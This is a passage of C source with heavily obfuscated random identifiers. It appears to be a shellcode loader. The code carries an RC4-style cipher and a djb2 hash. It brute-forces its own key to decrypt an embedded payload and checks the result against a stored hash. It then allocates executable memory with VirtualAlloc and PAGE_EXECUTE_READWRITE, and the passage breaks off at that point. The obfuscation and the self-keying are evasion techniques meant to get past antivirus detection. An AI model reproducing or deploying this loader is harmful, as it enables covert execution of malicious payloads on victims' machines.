        K = st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[(st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[st->FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4] + st->NAW1YBl3HHeZUn1k6wkstZYwMdaK0fV69KvvrOdOItYQZWIswqpEOFXxjy2rbT0MZnchJ2jYSjPojAfrLL3TyS3j47B1cahAy3L260mx1NRhwnZgQ0pA3RpnvxUuqBwH1Vtf[st->mTiY78zk9XD6bImq6HlmavvQ3pEI8d2b5LMCBl]) % 256];
        WvwK333U_w8CjDUjuYwQ44PZYh2DlVfk2MAHq0geE5L6xhs6DC1OdoGWwWbBUtsf_iI1WvQbUFrthBzM2cqR3hWx5iFStAbvD7p3Ti1dLxI[XUGedjgcvNqAWTGR_RRXNY3e8xnAAPSafZMZAfDmi79n2YfD8cl3dX2CJtTVGRDsl1OASCffmNtkhjg_w9IhRHm_iKrVButa4EItMhFzaHfP_IGuto3UiwJvDCQavPASZy5R0VRcUq55VikVU7eHOPR44EgHVlj2hsYxcD7P9MzvwtZxjBElPj0yWU50O7_cBBUc_bgJcnUm] ^= K;
    }
}


unsigned int rcZAoqXCLu_Bvugo63YjkK6y_cvUWPQ2CsQJqlyF4r16zfbq00_xZC_6FlgU7Ag1XbnYcjUXfU9mCO3vULL8KAe4uAdMu3e2hSuBj6_8hxysSqyu4bUJYIF5EZdLScMtaaqXboFl1YY0pzaGF9oqLHOEyVgGhoaBhrOhtVSZnZaTPVFJrlaZQWe4LYucC5_1rktOg_z(const unsigned char *WvwK333U_w8CjDUjuYwQ44PZYh2DlVfk2MAHq0geE5L6xhs6DC1OdoGWwWbBUtsf_iI1WvQbUFrthBzM2cqR3hWx5iFStAbvD7p3Ti1dLxI, int ySfnnRrX3WpfIqxZj5JCSUR2R7rjoYY3Tt6EF4qWCcpS) {
    unsigned int EZFb0jcAzkoSUfFKwAxZ_j4Dqj06VkVeGHDD67dC8l9n9aqCCsMYqE4R1LpZxJw7DYM76L0nFNFY9BavXGFN50Heybc2Bfm1e5fIYjBk2u1i2Gz4iunLWeFq38j7LaZnsRj5LOkQ6BJi64Frki0xGNSOpJPmhDTCZ1IKGZ_JKRtiDQo_pjzQAFNlk8FU5Y1 = 5381;
    int FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4;
    
    for (FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = 0; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 < ySfnnRrX3WpfIqxZj5JCSUR2R7rjoYY3Tt6EF4qWCcpS; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4++) {
        EZFb0jcAzkoSUfFKwAxZ_j4Dqj06VkVeGHDD67dC8l9n9aqCCsMYqE4R1LpZxJw7DYM76L0nFNFY9BavXGFN50Heybc2Bfm1e5fIYjBk2u1i2Gz4iunLWeFq38j7LaZnsRj5LOkQ6BJi64Frki0xGNSOpJPmhDTCZ1IKGZ_JKRtiDQo_pjzQAFNlk8FU5Y1 = ((EZFb0jcAzkoSUfFKwAxZ_j4Dqj06VkVeGHDD67dC8l9n9aqCCsMYqE4R1LpZxJw7DYM76L0nFNFY9BavXGFN50Heybc2Bfm1e5fIYjBk2u1i2Gz4iunLWeFq38j7LaZnsRj5LOkQ6BJi64Frki0xGNSOpJPmhDTCZ1IKGZ_JKRtiDQo_pjzQAFNlk8FU5Y1 * 33) + WvwK333U_w8CjDUjuYwQ44PZYh2DlVfk2MAHq0geE5L6xhs6DC1OdoGWwWbBUtsf_iI1WvQbUFrthBzM2cqR3hWx5iFStAbvD7p3Ti1dLxI[FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4]) & 0xFFFFFFFF;
    }
    return EZFb0jcAzkoSUfFKwAxZ_j4Dqj06VkVeGHDD67dC8l9n9aqCCsMYqE4R1LpZxJw7DYM76L0nFNFY9BavXGFN50Heybc2Bfm1e5fIYjBk2u1i2Gz4iunLWeFq38j7LaZnsRj5LOkQ6BJi64Frki0xGNSOpJPmhDTCZ1IKGZ_JKRtiDQo_pjzQAFNlk8FU5Y1;
}


unsigned int lWEGDTgzDRMWkw6VlMG2fu0zaShbzGyyeww8RB9SjJhQTVCRyLqNzws_otN58cn_5iiOLPEOcY0aHrIEHAH19s6hzjem9jVB(const unsigned char *bERRf3CWg9JsjNypoejYFtv3cj0e_fNtRQ5SZEtap6coOE1JH9nQfqRBE6C2B7nLi5pINHAr5h4I1AxMj) {
    return (unsigned int)bERRf3CWg9JsjNypoejYFtv3cj0e_fNtRQ5SZEtap6coOE1JH9nQfqRBE6C2B7nLi5pINHAr5h4I1AxMj[0] | 
           ((unsigned int)bERRf3CWg9JsjNypoejYFtv3cj0e_fNtRQ5SZEtap6coOE1JH9nQfqRBE6C2B7nLi5pINHAr5h4I1AxMj[1] << 8) | 
           ((unsigned int)bERRf3CWg9JsjNypoejYFtv3cj0e_fNtRQ5SZEtap6coOE1JH9nQfqRBE6C2B7nLi5pINHAr5h4I1AxMj[2] << 16) | 
           ((unsigned int)bERRf3CWg9JsjNypoejYFtv3cj0e_fNtRQ5SZEtap6coOE1JH9nQfqRBE6C2B7nLi5pINHAr5h4I1AxMj[3] << 24);
}


int Ma2t96wHxYSG2JivuzqBGbKIYfL5SHbLeZA0r0KjHRWLuxWfagzxCEErnwaecD9rv71iYI8NMvQV6wQ95bV_DJS14tymCAJi5oBOCEkoWzb1Eegz76CWU68SxN5oLygVwJLeeI9lPeBwC8LpIPSTsmPWvzQnQunnvJDnn6p1KHoywJP8TbVhDYOfhEePu(unsigned char *key, int smgCJQv107mH4Nckf2yvIWjVZDdqsjZROqwCkQgMJJEefkHm2JZ0fD3GMlQoXM5yPNatKzmDbTCbJQQwSOcpY0JkmgKOXMYr3cTLSlJRZvrXwDBwP_bgcCxHcJV8hC3ZM, int WL9vzMxRNOcqI8nchoYkFwJSADjCUFYinwr8JKgrUhoske3Jx2Jp2Cqg4ilQL_GbJ5WTXWYvWvu8ptX5sXfZDM8GLui7_TFwajP_XZBmBYoO_1r3RkyoFn_MHirhzh8x17iDN0ainwFi1FwZum, unsigned char *HPP4W1kJ8Qga4nFhyjBdVqTUdHZrx3c8fhBlu4Wqf4OlqdTEgX33F9TjfaoaOInCs012F_NtJCh, int AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B, unsigned char *AumJ9rf_td8fjQo, int *ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM) {
    int FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4;
    mO188XbQj9hC5RMj0TCPAhHM7KwFdUWYIDTSE8SmkjzU8Ot1szl8iXWgFTj_SXclyqcnR5aBfMZnaDekzzORq_5Lf6khCppFi9soozgF_5eQRWPjJH1799fm4VtmZP1bDiLb8YaQGWAcB_GnDObmY_dSiAihvDcwB9AHj6i6Yze5JHk6Ni8EtNXjP9UOxcoFTMHKF3pWgbI1aodG3 bngJ0Li0sEyDvR8WLSsDlDTO4mDBuRYsqyrlYmeblO6D493GyXnTcsBBnwoOdNclm6HUV;
    unsigned int ZDGzoHgx34u2AaUTyevOXPkT9zP021qtLFYtBRaUBv58nojYNJOFWLJOB5_grlTpznE9_tEa_hObBMcMVhQCMA3MLvXhu0XrfO0SlpWJj1__mDbW3IrhkRQYhn9OO86JD8GwDhry4zeU_Re4fcfpt3JhwY5JI7utMxpZn_gGZs5pcmQGejnvrZAFMjIETcWzizQ7ISDjnUlLZ2pFOhYM836QYm7Y60;
    unsigned int gRLNhCjQIU1gX_zI4z_HUqaYU9hbx37cMYTs90cEQ49f1VuQbZZ4gTRemdgA = lWEGDTgzDRMWkw6VlMG2fu0zaShbzGyyeww8RB9SjJhQTVCRyLqNzws_otN58cn_5iiOLPEOcY0aHrIEHAH19s6hzjem9jVB(eJeqyOUCXkDN);
    
    if (smgCJQv107mH4Nckf2yvIWjVZDdqsjZROqwCkQgMJJEefkHm2JZ0fD3GMlQoXM5yPNatKzmDbTCbJQQwSOcpY0JkmgKOXMYr3cTLSlJRZvrXwDBwP_bgcCxHcJV8hC3ZM == WL9vzMxRNOcqI8nchoYkFwJSADjCUFYinwr8JKgrUhoske3Jx2Jp2Cqg4ilQL_GbJ5WTXWYvWvu8ptX5sXfZDM8GLui7_TFwajP_XZBmBYoO_1r3RkyoFn_MHirhzh8x17iDN0ainwFi1FwZum) {
        unsigned char c49jN8NNhkOxbM84rBSLBiB8jWs3e22p9kG8sLL1B[8192];
        unsigned char PvT95Hpq0lZdwNwoamJqAjdjUR0MDAQJMte16z9aroEbsYLKB1rwUMhC42HJiWLKH3Lav5r50w9xoJyQxUMYoh10J7afZjyDz0g6KG1JweA4nxGzxXobDNSd5WHrYqPylYrC8PEpmVMAzqUJdf17VJtY9trQhMncMYQBG20eEKJNejw5AErizTF1oCbK8[8192];
        
        
        if (KEY_SIZE == 1) {
            
        } else if (KEY_SIZE == 2) {
            
        } else {
            
        }
        
        memcpy(c49jN8NNhkOxbM84rBSLBiB8jWs3e22p9kG8sLL1B, HPP4W1kJ8Qga4nFhyjBdVqTUdHZrx3c8fhBlu4Wqf4OlqdTEgX33F9TjfaoaOInCs012F_NtJCh, AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B);
        HUt8Q9_f(&bngJ0Li0sEyDvR8WLSsDlDTO4mDBuRYsqyrlYmeblO6D493GyXnTcsBBnwoOdNclm6HUV, key, WL9vzMxRNOcqI8nchoYkFwJSADjCUFYinwr8JKgrUhoske3Jx2Jp2Cqg4ilQL_GbJ5WTXWYvWvu8ptX5sXfZDM8GLui7_TFwajP_XZBmBYoO_1r3RkyoFn_MHirhzh8x17iDN0ainwFi1FwZum);
        sfsvdpjlx6j1_Tg6C7mLdgS72roe3Z3IIrBwIVYxhRh38v2Ki7bUoB7hhb1jn9QK8y8bYcbrEMzksNBdia96vhEWZZKn4LDyMhAreYRZJY2xBHVwfJR_vHYidUBCDCdfvS(&bngJ0Li0sEyDvR8WLSsDlDTO4mDBuRYsqyrlYmeblO6D493GyXnTcsBBnwoOdNclm6HUV, c49jN8NNhkOxbM84rBSLBiB8jWs3e22p9kG8sLL1B, AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B);
        
        
        int UsYHcV37mJgsx98hdGP0 = iPcnrPS8NHlbnBVHwpejtPjKBG34zkMo8gIOH6d_6k5yQ65yAJqMN9P2Lcmf12E6iS5UqkDQTWWUDdT1VRlDdXL6WhHiPyixdzSkxGSz8Acwy3akoNPCIb_neeDFwE78pPBes9rYxsGa(c49jN8NNhkOxbM84rBSLBiB8jWs3e22p9kG8sLL1B, AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B, PvT95Hpq0lZdwNwoamJqAjdjUR0MDAQJMte16z9aroEbsYLKB1rwUMhC42HJiWLKH3Lav5r50w9xoJyQxUMYoh10J7afZjyDz0g6KG1JweA4nxGzxXobDNSd5WHrYqPylYrC8PEpmVMAzqUJdf17VJtY9trQhMncMYQBG20eEKJNejw5AErizTF1oCbK8, 8192);
        
        if (UsYHcV37mJgsx98hdGP0 > 0) {
            
            
            unsigned char VSZ0kjpg7IgTphLeLW_OKXbLCsirwSpedgjM9FdatTkMAcHE8PEzAiyA5nufSnaL3V3jVYLVOoSsALFK3jMJPPC7SDj9jEEDNE1otIopFW_kMTRm8RE3EI2ihyI_9AMIdXxZ_p6Cnx63KpthJlbbVTiqrHA1HV5mU3TD_E6wK7dGOtGnfXme5s2KlSD4h1xGHM[8192];
            memcpy(VSZ0kjpg7IgTphLeLW_OKXbLCsirwSpedgjM9FdatTkMAcHE8PEzAiyA5nufSnaL3V3jVYLVOoSsALFK3jMJPPC7SDj9jEEDNE1otIopFW_kMTRm8RE3EI2ihyI_9AMIdXxZ_p6Cnx63KpthJlbbVTiqrHA1HV5mU3TD_E6wK7dGOtGnfXme5s2KlSD4h1xGHM, PvT95Hpq0lZdwNwoamJqAjdjUR0MDAQJMte16z9aroEbsYLKB1rwUMhC42HJiWLKH3Lav5r50w9xoJyQxUMYoh10J7afZjyDz0g6KG1JweA4nxGzxXobDNSd5WHrYqPylYrC8PEpmVMAzqUJdf17VJtY9trQhMncMYQBG20eEKJNejw5AErizTF1oCbK8, UsYHcV37mJgsx98hdGP0);
            int aIM41w7SSarrzzd4rQBM4wcwJR3WaYUEA_uP58_9ctus6LJA7VZY = sizeof(JrnhmLCQSuOJwZHyQ9OrnvtNKtAnUjsvYnvR7r6WdCfEKtdnLDEFRhPTpAO1RJ43JCyV5lRmX5pLRkgqIrdIQJCgAlUWYKr3FGQchRbN46ruiDaIrrQ4OlMRbAYbW8ngQ34ueVVNDTEZcUrw6Be) - 1;
            memcpy(VSZ0kjpg7IgTphLeLW_OKXbLCsirwSpedgjM9FdatTkMAcHE8PEzAiyA5nufSnaL3V3jVYLVOoSsALFK3jMJPPC7SDj9jEEDNE1otIopFW_kMTRm8RE3EI2ihyI_9AMIdXxZ_p6Cnx63KpthJlbbVTiqrHA1HV5mU3TD_E6wK7dGOtGnfXme5s2KlSD4h1xGHM + UsYHcV37mJgsx98hdGP0, JrnhmLCQSuOJwZHyQ9OrnvtNKtAnUjsvYnvR7r6WdCfEKtdnLDEFRhPTpAO1RJ43JCyV5lRmX5pLRkgqIrdIQJCgAlUWYKr3FGQchRbN46ruiDaIrrQ4OlMRbAYbW8ngQ34ueVVNDTEZcUrw6Be, aIM41w7SSarrzzd4rQBM4wcwJR3WaYUEA_uP58_9ctus6LJA7VZY);
            
            
            ZDGzoHgx34u2AaUTyevOXPkT9zP021qtLFYtBRaUBv58nojYNJOFWLJOB5_grlTpznE9_tEa_hObBMcMVhQCMA3MLvXhu0XrfO0SlpWJj1__mDbW3IrhkRQYhn9OO86JD8GwDhry4zeU_Re4fcfpt3JhwY5JI7utMxpZn_gGZs5pcmQGejnvrZAFMjIETcWzizQ7ISDjnUlLZ2pFOhYM836QYm7Y60 = rcZAoqXCLu_Bvugo63YjkK6y_cvUWPQ2CsQJqlyF4r16zfbq00_xZC_6FlgU7Ag1XbnYcjUXfU9mCO3vULL8KAe4uAdMu3e2hSuBj6_8hxysSqyu4bUJYIF5EZdLScMtaaqXboFl1YY0pzaGF9oqLHOEyVgGhoaBhrOhtVSZnZaTPVFJrlaZQWe4LYucC5_1rktOg_z(VSZ0kjpg7IgTphLeLW_OKXbLCsirwSpedgjM9FdatTkMAcHE8PEzAiyA5nufSnaL3V3jVYLVOoSsALFK3jMJPPC7SDj9jEEDNE1otIopFW_kMTRm8RE3EI2ihyI_9AMIdXxZ_p6Cnx63KpthJlbbVTiqrHA1HV5mU3TD_E6wK7dGOtGnfXme5s2KlSD4h1xGHM, UsYHcV37mJgsx98hdGP0 + aIM41w7SSarrzzd4rQBM4wcwJR3WaYUEA_uP58_9ctus6LJA7VZY);
            
            if (ZDGzoHgx34u2AaUTyevOXPkT9zP021qtLFYtBRaUBv58nojYNJOFWLJOB5_grlTpznE9_tEa_hObBMcMVhQCMA3MLvXhu0XrfO0SlpWJj1__mDbW3IrhkRQYhn9OO86JD8GwDhry4zeU_Re4fcfpt3JhwY5JI7utMxpZn_gGZs5pcmQGejnvrZAFMjIETcWzizQ7ISDjnUlLZ2pFOhYM836QYm7Y60 == gRLNhCjQIU1gX_zI4z_HUqaYU9hbx37cMYTs90cEQ49f1VuQbZZ4gTRemdgA) {
                if (KEY_SIZE == 1) {
                    
                } else if (KEY_SIZE == 2) {
                    
                } else {
                    
                }
                memcpy(AumJ9rf_td8fjQo, PvT95Hpq0lZdwNwoamJqAjdjUR0MDAQJMte16z9aroEbsYLKB1rwUMhC42HJiWLKH3Lav5r50w9xoJyQxUMYoh10J7afZjyDz0g6KG1JweA4nxGzxXobDNSd5WHrYqPylYrC8PEpmVMAzqUJdf17VJtY9trQhMncMYQBG20eEKJNejw5AErizTF1oCbK8, UsYHcV37mJgsx98hdGP0);
                *ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM = UsYHcV37mJgsx98hdGP0;
                return 1;
            }
        }
        return 0;
    }
    
    
    for (FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 = 1; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4 <= 255; FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4++) {
        key[smgCJQv107mH4Nckf2yvIWjVZDdqsjZROqwCkQgMJJEefkHm2JZ0fD3GMlQoXM5yPNatKzmDbTCbJQQwSOcpY0JkmgKOXMYr3cTLSlJRZvrXwDBwP_bgcCxHcJV8hC3ZM] = (unsigned char)FxYOEti1sZyQQcExl4r5jbv9SBsNHzHQjznNico8hQyBmeFJkQjjdhVn7ijJ3pk88ZnOcY7mXwZJ5Ys_4xrIJxHjozIXX4oJS2yGT9sXbZT_aKP7g1rItleAizzhotVEdC0mK_1MI8wbEMP31Ogjp0ITDhvwu6jhINT1UDXdf4;
        if (Ma2t96wHxYSG2JivuzqBGbKIYfL5SHbLeZA0r0KjHRWLuxWfagzxCEErnwaecD9rv71iYI8NMvQV6wQ95bV_DJS14tymCAJi5oBOCEkoWzb1Eegz76CWU68SxN5oLygVwJLeeI9lPeBwC8LpIPSTsmPWvzQnQunnvJDnn6p1KHoywJP8TbVhDYOfhEePu(key, smgCJQv107mH4Nckf2yvIWjVZDdqsjZROqwCkQgMJJEefkHm2JZ0fD3GMlQoXM5yPNatKzmDbTCbJQQwSOcpY0JkmgKOXMYr3cTLSlJRZvrXwDBwP_bgcCxHcJV8hC3ZM + 1, WL9vzMxRNOcqI8nchoYkFwJSADjCUFYinwr8JKgrUhoske3Jx2Jp2Cqg4ilQL_GbJ5WTXWYvWvu8ptX5sXfZDM8GLui7_TFwajP_XZBmBYoO_1r3RkyoFn_MHirhzh8x17iDN0ainwFi1FwZum, HPP4W1kJ8Qga4nFhyjBdVqTUdHZrx3c8fhBlu4Wqf4OlqdTEgX33F9TjfaoaOInCs012F_NtJCh, AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B, AumJ9rf_td8fjQo, ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    
    unsigned char key[KEY_SIZE];
    unsigned char AumJ9rf_td8fjQo[8192];
    unsigned char HPP4W1kJ8Qga4nFhyjBdVqTUdHZrx3c8fhBlu4Wqf4OlqdTEgX33F9TjfaoaOInCs012F_NtJCh[8192];
    int y7GR9oXRWKCo8aT4faP3TRUFoCeQUnMuJEchpx_vMn39rYQ8f0vvj21jUgbpanKf6dE2zP8OvYSw9L_zdgSewuoL_jres3QrLzRD28H5NJOIAXchD06XMThcM2BPerbV8cLFo_GaclL8Ezdfub7Dyo0eHRVsCcR29DaoRzQGxLVBzs2RZyzR5kFuKozsjtKvSKcz0glI3Kx7d646myq4cBQ7KdlJNvgCuGImtJYc2jFl_m1CYNIc9gPxRK4u = sizeof(l6VbJUvZ2_H6se7fNrff_HzsVuU9n5XYdIAog5VNLQDP6iqYjrUmcTohlWUKaqCYOybH9fXOxWuQTqgOhaHy2OVJcDFWfh7vDBLGHbFEiL_J34Ef6iZPireNuAsPtGaEA6orZd31C0udSnCddd8C2AEv2LOJrFYE68DNtgWqyCKof04dOFrDfeeAyjX5Kz9sYPmIn5CAhdM6PI6T0s5QPGKo5ptSjXZqXdMnc) - 1;
    int ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM = 0;
    int wgTuG6xbMoVghTNin_ucUoemEYtiXOP4RmcqryQZA6zk1bbOuStkWu3NNolhWM_vJV8AlEt6M1hOGXouPCpOaFYs5U9YdTnaUGpkmB5CDU9zc0uR4y3MywHrQ_94kq4 = 0;
    
    
    
    
    
    
    int AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B = mZrAZIAT47ledjIBXAYcXjsbY_bJXuyFHoP0cghBPKVuzQs9xq0XyGEyFHAIGyVS3SZw5RNnKsfs9xb9TdF3BNQll64P2le1Rrn_J1lGl9IBTXq1DXYjfTN_ii_BM55XgA1X1(l6VbJUvZ2_H6se7fNrff_HzsVuU9n5XYdIAog5VNLQDP6iqYjrUmcTohlWUKaqCYOybH9fXOxWuQTqgOhaHy2OVJcDFWfh7vDBLGHbFEiL_J34Ef6iZPireNuAsPtGaEA6orZd31C0udSnCddd8C2AEv2LOJrFYE68DNtgWqyCKof04dOFrDfeeAyjX5Kz9sYPmIn5CAhdM6PI6T0s5QPGKo5ptSjXZqXdMnc, y7GR9oXRWKCo8aT4faP3TRUFoCeQUnMuJEchpx_vMn39rYQ8f0vvj21jUgbpanKf6dE2zP8OvYSw9L_zdgSewuoL_jres3QrLzRD28H5NJOIAXchD06XMThcM2BPerbV8cLFo_GaclL8Ezdfub7Dyo0eHRVsCcR29DaoRzQGxLVBzs2RZyzR5kFuKozsjtKvSKcz0glI3Kx7d646myq4cBQ7KdlJNvgCuGImtJYc2jFl_m1CYNIc9gPxRK4u, HPP4W1kJ8Qga4nFhyjBdVqTUdHZrx3c8fhBlu4Wqf4OlqdTEgX33F9TjfaoaOInCs012F_NtJCh);
    if (AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B <= 0) {
        
        return 1;
    }
    
    
    
    
    
    memset(key, 0, sizeof(key));
    if (Ma2t96wHxYSG2JivuzqBGbKIYfL5SHbLeZA0r0KjHRWLuxWfagzxCEErnwaecD9rv71iYI8NMvQV6wQ95bV_DJS14tymCAJi5oBOCEkoWzb1Eegz76CWU68SxN5oLygVwJLeeI9lPeBwC8LpIPSTsmPWvzQnQunnvJDnn6p1KHoywJP8TbVhDYOfhEePu(key, 0, KEY_SIZE, HPP4W1kJ8Qga4nFhyjBdVqTUdHZrx3c8fhBlu4Wqf4OlqdTEgX33F9TjfaoaOInCs012F_NtJCh, AosVBQPOoIr9vElDY9Gway9HQzyGixwxGaQ1Jtqq2Gw6_wpvDYnnUSRrpNjkBqymb3B, AumJ9rf_td8fjQo, &ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM)) {
        wgTuG6xbMoVghTNin_ucUoemEYtiXOP4RmcqryQZA6zk1bbOuStkWu3NNolhWM_vJV8AlEt6M1hOGXouPCpOaFYs5U9YdTnaUGpkmB5CDU9zc0uR4y3MywHrQ_94kq4 = 1;
    }
    
    if (wgTuG6xbMoVghTNin_ucUoemEYtiXOP4RmcqryQZA6zk1bbOuStkWu3NNolhWM_vJV8AlEt6M1hOGXouPCpOaFYs5U9YdTnaUGpkmB5CDU9zc0uR4y3MywHrQ_94kq4 && ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM > 0) {
        
        
        
        
        void *f1gOiqvhiiO0NKWMKiHqt4crZR5WSzwb_arLeTj5dGxc05vMu1Amc_aTfPIOsf46Vp5G_GVHdecYV1pyhk9UPNHA3ZlNVvkM02Xu3UTPVSpcSvNkMBYBQZvbyT22efGjFybQOESl8C8jKIBA4VJyLEj0n30hk64innQ2leXbcN_9sCqG9LETwP3mehZ8_Avm3ntrNWNXGq9ANnPSxwfnGe5x9LYDMnIM7dt8N = VirtualAlloc(0, ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (f1gOiqvhiiO0NKWMKiHqt4crZR5WSzwb_arLeTj5dGxc05vMu1Amc_aTfPIOsf46Vp5G_GVHdecYV1pyhk9UPNHA3ZlNVvkM02Xu3UTPVSpcSvNkMBYBQZvbyT22efGjFybQOESl8C8jKIBA4VJyLEj0n30hk64innQ2leXbcN_9sCqG9LETwP3mehZ8_Avm3ntrNWNXGq9ANnPSxwfnGe5x9LYDMnIM7dt8N) {
            
            
